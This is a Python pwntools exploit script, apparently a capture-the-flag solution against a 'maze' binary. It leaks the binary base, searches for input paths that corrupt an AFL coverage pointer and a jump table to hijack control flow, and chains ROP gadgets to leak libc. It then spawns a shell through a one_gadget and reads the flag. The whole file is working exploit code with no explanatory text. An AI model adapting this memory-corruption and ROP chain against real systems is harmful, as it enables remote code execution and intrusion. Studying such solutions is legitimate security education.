from pwn import *
import pickle
import numpy as np
import os
import random
import sys

LOCAL = len(sys.argv) == 1

MAIN_READ_ARGS_OFF = 0xb00c7d
MAIN_READ_OFF = 0xb00c8e
READ_PLT_OFF = 0x180900
MAIN_JMP_ROOM_OFF = 0xb00d0e
POP_RDI_GADGET_OFF = 0x192cfd
POP_RDX_GADGET_OFF = 0x252d02
POP_RSI_GADGET_OFF = 0x4c10
POP_RSP_GADGET_OFF = 0x4c90cd
PUTS_PLT_OFF = 0x180950
STDERR_OFF = 0x117f040

if LOCAL:
    LIBC_STDERR_OFF = 0x3ec680
    LIBC_ONE_GADGET_OFF = 0x4f322
else:
    LIBC_STDERR_OFF = 0x1eb5c0
    LIBC_ONE_GADGET_OFF = 0x10af39

class Analysis:
    def __init__(self, xors, csu_init, scratch, scratch_size, afl_area_ptr, room, rooms, base_addr):
        self.xors = xors
        self.xors_np = np.array(xors, np.int32)
        self.xors_set = set(xors)
        self.csu_init = csu_init
        self.scratch = scratch
        self.scratch_addr = base_addr + scratch
        self.scratch_size = scratch_size
        self.afl_area_ptr = afl_area_ptr
        self.room = room
        self.rooms = rooms
        self.base_addr = base_addr
        self.csu_init_addr = base_addr + self.csu_init
        self.move = 0
        self.target_room = None
        self.tried_moves = set()
        self.init = 0
        self.main_read_args_addr = base_addr + MAIN_READ_ARGS_OFF
        self.main_read_addr = base_addr + MAIN_READ_OFF
        self.pop_rdi_gadget_addr = base_addr + POP_RDI_GADGET_OFF
        self.pop_rdx_gadget_addr = base_addr + POP_RDX_GADGET_OFF
        self.pop_rsi_gadget_addr = base_addr + POP_RSI_GADGET_OFF
        self.pop_rsp_gadget_addr = base_addr + POP_RSP_GADGET_OFF
        self.main_jmp_room_addr = base_addr + MAIN_JMP_ROOM_OFF
        self.puts_plt_addr = base_addr + PUTS_PLT_OFF
        self.read_plt_addr = base_addr + READ_PLT_OFF
        self.stdout_addr = base_addr + STDERR_OFF
        self.trace_get_path = False
        self.trace_get_targets = False
        self.trace_get_write_paths = False
        self.trace_get_jmp_path = False
        self.trace_verify_path = False
        self.path_cache = {}
        if os.path.isfile("path_cache.p"):
            self.path_cache = pickle.load(open("path_cache.p", "rb"))
        self.update()

    def update(self, move=-1, target_room=0):
        if move != -1:
            self.move = move
        if target_room != 0:
            self.target_room = target_room
        self.room_off = self.room - self.csu_init - self.move
        self.rooms_off = self.rooms - self.csu_init - self.move
        self.afl_area_ptr_off = self.afl_area_ptr - self.csu_init - self.move
        self.scratch_off = self.scratch - self.csu_init - self.move
        if self.target_room:
            self.target_room_off = self.rooms_off + self.target_room * 8
            self.fake_room = self.target_room + 0x10000
            self.fake_room_off = self.rooms_off + self.fake_room * 8

    def in_scratch(self, addr):
        return addr >= self.scratch_off and addr < self.scratch_off + self.scratch_size

    def get_path(self, goal, xor_goal=False, blacklist=set()):
        if (self.init, goal, self.move) in self.path_cache and not xor_goal:
            cached = self.path_cache[(self.init, goal, self.move)]
            if cached == None:
                return None
            if len(blacklist) > 0 and self.verify_fast(cached[1], cached[0], {b:0 for b in blacklist}):
                self.init = cached[1]
                return cached[0]
            else:
                self.init = cached[1]
                return cached[0] 
        if self.trace_get_path:
            print(f"[+] get_path: init = {hex(self.init)}, goal = {hex(goal)}, xor_goal = {xor_goal}")
        paths = set()
        new_paths = {self.init : []}
        while len(new_paths) > 0:
            newp = {}
            #if self.trace_get_path:
            #    print("[+] get_path: new_paths = ", new_paths)
            for i, p in new_paths.items():
                i >>= 1
                if xor_goal:
                    if self.in_scratch(i ^ goal):
                        self.init = goal
                        return p + [self.xors.index(goal)]  
                else:
                    if i ^ goal in self.xors_set and any(self.in_scratch(((i ^ goal) >> 1) ^ x) for x in self.xors_np):
                        path = p + [np.where(self.xors_np == i ^ goal)[0][0]]
                        self.path_cache[(self.init, goal, self.move)] = (path, i ^ goal)
                        self.init = i ^ goal
                        return path
                for j in range(self.scratch_off, self.scratch_off + self.scratch_size):
                    xor = i ^ j
                    if xor in self.xors_set and xor not in paths and j not in blacklist:
                        newp[xor] = p + [np.where(self.xors_np == xor)[0][0]]
                        paths.add(xor)
            new_paths = newp
        self.path_cache[(self.init, goal, self.move)] = None
        return None

    def get_targets(self):
        xors_shifted = self.xors_np >> 1
        offs = []
        for i, xor in enumerate(self.xors_np[0xc8:0x200]):
            writes = xor ^ xors_shifted
            writes = writes == self.room_off + 2
            indices = writes.nonzero()[0].tolist()
            if len(indices) > 0:
                offs += [(i + 0xc8, idx) for idx in indices]
        offs.sort()
        return offs

    def get_write_path(self, addr, value):
        if self.trace_get_write_paths:
            print(f"[+] Getting write path: init = {hex(self.init)}, addr = {hex(addr)}, value = {value}")
        init = self.init
        path = []
        for i, b in enumerate(value):
            if b > 0:
                p = self.get_path(addr + i, blacklist=set(addr + j for j in range(8) if j != i))
                if p == None:
                    self.init = init
                    return None
                path += p
                cont = False
                for j in range(b - 1):
                    p = self.get_path(addr + i, blacklist=set(addr + j for j in range(8) if j != i))
                    if p == None:
                        self.init = init
                        return None
                    path += p
        return path

    def get_jmp_path(self, addr, prev_move_path=[]):
        orig_move = self.move
        orig_init = self.init
        for byte in range(3):
            self.init = orig_init
            self.update(orig_move)
            move_path = self.get_path(self.afl_area_ptr_off + byte)
            if move_path != None:
                next_csu_init_addr = ((self.csu_init_addr + self.move) & (0xFFFFFFFFFFFFFFFF ^ (0xFF << (byte * 8))))
                next_csu_init_addr |= ((((((self.csu_init_addr + self.move) >> (byte * 8)) & 0xFF) + 1) & 0xFF) << (byte * 8))
                move = next_csu_init_addr - self.csu_init_addr
                if move in self.tried_moves or move >= self.scratch_off - 0x10000:
                    continue
                self.tried_moves.add(move)
                self.update(move)

                targets = self.get_targets()
                init = self.init
                for target in targets:
                    self.init = init
                    self.update(move, target_room=target[0])
                    if self.trace_get_jmp_path:
                        print(f"[+] get_jmp_path: init = {hex(self.init)}, move = {hex(move)}, fake_room = {hex(self.fake_room)}, fake_room_off = {hex(self.fake_room_off)}, addr = {hex(addr)}")
                    if self.get_path(self.xors_np[target[1]], True) != None:
                        self.init = init
                        
                        print(f"[+] get_jmp_path getting write path: fake_room_off = {hex(self.fake_room_off)}, addr = {hex(addr)}")

                        writes = self.verify_path(0, prev_move_path + move_path, {self.fake_room_off + self.move + i : b for i, b in enumerate(p64(addr))}) 
                        new_addr = bytearray(8)
                        for i, w in writes.items():
                            new_addr[i - self.fake_room_off - self.move] = w & 0xFF

                        write_path = self.get_write_path(self.fake_room_off, bytes(new_addr))
                        if write_path != None:
                            jmp_path = self.get_path(self.xors_np[target[1]], True)
                            if jmp_path != None:
                                return move_path + write_path + jmp_path + [target[0]]

                    self.init = init
                    path = self.get_jmp_path(addr, prev_move_path + move_path)
                    if path != None:
                        return move_path + path
        return None

    def verify_path(self, init, path, writes, conn=None):
        prev = init
        move = 0
        moved_writes = writes
        for p in path:
            write = (prev >> 1) ^ self.xors_np[p]
            prev = self.xors_np[p]
            if write + move in writes:
                writes[write+move] -= 1
    
            if self.trace_verify_path:
                print(f"[+] verify_path: room = {p}, xor = {hex(self.xors_np[p])}, write = {hex(write)}, prev = {hex(prev)}, move = {hex(move)}")

            if write < self.afl_area_ptr_off + self.move - move or write >= self.scratch_size + self.scratch_off + self.move - move:
                if self.trace_verify_path:
                    print("[!] verify_path oob:", hex(write), hex(self.afl_area_ptr_off + self.move - move))
                return None

            byte = write - (self.afl_area_ptr_off + self.move - move)
            if byte >= 0 and byte < 3:
                csu_init_addr = ((self.csu_init_addr + move) & (0xFFFFFFFFFFFF ^ (0xFF << (byte * 8))))
                csu_init_addr |= ((((((self.csu_init_addr + move) >> (byte * 8)) & 0xFF) + 1) & 0xFF) << (byte * 8))
                move = csu_init_addr - self.csu_init_addr
                if self.trace_verify_path:
                    print("[+] verify_path move:", byte, hex(self.csu_init_addr + move), hex(csu_init_addr), hex(move))

            if conn:
                conn.readuntil("room: ")
                conn.sendline(hex(p)[2:])
        return writes

    def verify_fast(self, init, path, black_list=set()):
        prev = init
        for p in path:
            xor = self.xors_np[p]
            write = (prev >> 1) ^ xor
            prev = xor
            if write in black_list or write < self.afl_area_ptr_off or write >= self.scratch_size + self.scratch_off + self.move:
                return False
        return True

    def save_cache(self):
        pickle.dump(self.path_cache, open("path_cache.p", "wb"))

COUNT = 2 ** 16
context.terminal = ['tmux', 'splitw', '-v']


A = pickle.load(open("analysis.p", "rb"))

def send_path(conn, path):
    for i, p in enumerate(path):
        if i % 128 == 0: 
            print(f"[+] Sending path {i}/{len(path)}")
        conn.readuntil("room:")
        conn.sendline(hex(p)[2:])

while True:
    if LOCAL:
        conn = process("./maze")
    elif args.LOCALREMOTE:
        conn = remote("localhost", 1024)
    else:
        #remote ssl=True doesn't work for me for some reason
        # conn = process(f"ncat --ssl {sys.argv[1]} {sys.argv[2]}", shell=True)
        conn = process(f"ncat {sys.argv[1]} {sys.argv[2]}", shell=True)

    conn.send("A" * 32)
    conn.readuntil("A" * 32)
    BASE_ADDR = u64(conn.readuntil("!").ljust(8, b"\x00")) - A["csu_init"]
    BASE_ADDR &= 0xFFFFFFFFFFFF
    if not ((BASE_ADDR >> 40) & 0xFF == 0x55 or (BASE_ADDR >> 40) & 0xFF == 0x56):
        continue
    
    print(f"[+] Leaked binary base address: {hex(BASE_ADDR)}")
    analysis = Analysis(A["xors"], A["csu_init"], A["scratch"], A["scratch_size"], A["afl_area_ptr"], A["room"], A["rooms"], BASE_ADDR)
    #analysis.trace_get_write_paths = True
    #analysis.trace_get_path = True
    #analysis.trace_get_jmp_path = True
    path = analysis.get_jmp_path(analysis.main_read_args_addr)
    analysis.save_cache()
    print(path)
    #gdb.attach(conn, f"b *{analysis.main_read_args_addr}")
    #analysis.trace_verify_path = True
    #analysis.verify_path(0, path, {})
    send_path(conn, path)

    conn.readuntil("room:")
    conn.sendline("q")

    first_chain = (b"A" * 16 + p64(analysis.main_jmp_room_addr)).ljust(32, b"B")

    third_chain = b"A" * 24
    third_chain += p64(analysis.pop_rdi_gadget_addr)
    third_chain += p64(analysis.stdout_addr)
    third_chain += p64(analysis.puts_plt_addr)
    third_chain += p64(analysis.pop_rsi_gadget_addr) 
    third_chain += p64(analysis.scratch_addr) 
    third_chain += p64(analysis.pop_rdx_gadget_addr) 
    third_chain += p64(0x123)
    third_chain += p64(analysis.pop_rdi_gadget_addr)
    third_chain += p64(0)
    third_chain += p64(analysis.read_plt_addr)
    third_chain += p64(analysis.pop_rsp_gadget_addr)
    third_chain += p64(analysis.scratch_addr)

    second_chain = b"A" * 8 + p64(analysis.pop_rdx_gadget_addr) + p64(len(third_chain)) + p64(analysis.main_read_addr)

    conn.send(first_chain)
    conn.send(second_chain)
    conn.send(third_chain)

    conn.readuntil("\n")
    leak = conn.readuntil("\n")[:-1]
    LIBC_BASE = u64(leak.ljust(8, b"\00")) - LIBC_STDERR_OFF
    LIBC_BASE &= 0xFFFFFFFFFFFF
    if (LIBC_BASE >> 40) & 0xFF != 0x7f:
        continue
    print(f"[+] Leaked libc base: libc_base = {hex(LIBC_BASE)}")

    conn.send(p64(LIBC_BASE + LIBC_ONE_GADGET_OFF).ljust(0x123, b"\x00"))

    conn.sendline("cat flag")

    conn.interactive()
    break

